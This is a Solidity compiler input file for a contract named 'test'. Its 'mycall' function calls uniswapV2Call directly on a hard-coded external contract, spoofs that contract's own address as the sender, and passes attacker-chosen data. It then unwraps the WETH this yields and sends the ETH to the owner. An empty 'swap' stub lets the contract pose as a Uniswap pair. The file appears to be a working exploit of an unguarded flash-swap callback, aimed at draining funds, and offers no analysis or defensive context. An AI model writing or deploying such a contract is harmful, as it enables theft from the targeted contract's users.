{"language":"Solidity","settings":{"libraries":{},"metadata":{"useLiteralContent":true},"optimizer":{"enabled":false,"runs":200},"remappings":[],"outputSelection":{"*":{"*":["*"],"":["*"]}}},"sources":{"contracts/temp.sol":{"content":"pragma solidity =0.6.6;\npragma experimental ABIEncoderV2;\n\n\ninterface IERC20 {\n    function balanceOf(address owner) external view returns (uint);\n    function approve(address spender, uint value) external returns (bool);\n}\n\ninterface IUniswapV2Callee {\n    function uniswapV2Call(address sender, uint amount0, uint amount1, bytes calldata data) external;\n}\n\ninterface IWETH {\n    function withdraw(uint) external;\n}\n\ncontract test{\n\n    address payable public owner;\n\n\n    constructor() public {\n        owner = msg.sender;\n    }\n    \n    \n    modifier onlyowner{\n        require(msg.sender == owner);\n        _;\n    }\n\n\n\n    receive() external payable {}\n\n\n    function deposit() payable external{\n    }\n\n\n    function _safeTransfer(address token, address to, uint value) private {\n        (bool success, bytes memory data) = token.call(abi.encodeWithSelector(bytes4(keccak256(bytes('transfer(address,uint256)'))), to, value));\n    }\n    \n\n    \n    function withdrawtokenall(address tokenaddr) external onlyowner{\n        _safeTransfer(tokenaddr, owner, IERC20(tokenaddr).balanceOf(address(this)));\n    }\n    \n    function withdrawethall() external onlyowner {\n        msg.sender.transfer(address(this).balance);\n    }\n    \n\n\n    function swap(uint amount0Out, uint amount1Out, address to, bytes memory data) public{\n        \n    }\n\n\n    function mycall(bytes memory data) public onlyowner{\n        \n        IUniswapV2Callee(address(0x8b11e395a041A34B32110Fd6Bbb83f94Cf2c1B83)).uniswapV2Call(address(0x8b11e395a041A34B32110Fd6Bbb83f94Cf2c1B83), \n        0, 908000000000000000, data);\n     \n        uint256 balance = IERC20(address(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2)).balanceOf(address(this));\n        \n        IWETH(address(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2)).withdraw(balance);\n        \n        owner.transfer(address(this).balance);\n        \n        // _safeTransfer(address(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2), owner, balance);\n        \n    }\n\n  \n}"}}}